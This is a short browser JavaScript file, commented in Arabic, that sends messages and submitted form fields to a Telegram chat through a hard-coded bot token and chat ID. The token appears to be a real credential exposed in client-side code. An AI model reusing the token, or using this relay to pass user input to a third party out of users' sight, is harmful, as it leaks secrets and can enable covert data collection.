// ==========================================
// ملف إرسال البيانات إلى Telegram
// ==========================================

const BOT_TOKEN = '8663691866:AAHAiZazF3nfltbRpEOVmfMMftMsBl5--HI';
const CHAT_ID = '6820391955';

async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const result = await response.json();
        if (result.ok) {
            console.log('✓ تم الإرسال بنجاح');
        } else {
            console.log('✗ خطأ:', result.description);
        }
        return result;
    } catch (error) {
        console.error('✗ فشل الإرسال:', error);
    }
}

async function sendFormData(fields, formName) {
    let message = `📋 <b>${formName}</b>\n`;
    message += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;
    for (const [key, value] of Object.entries(fields)) {
        message += `• <b>${key}:</b> ${value}\n`;
    }
    await sendToTelegram(message);
}

window.sendToTelegram = sendToTelegram;
window.sendFormData = sendFormData;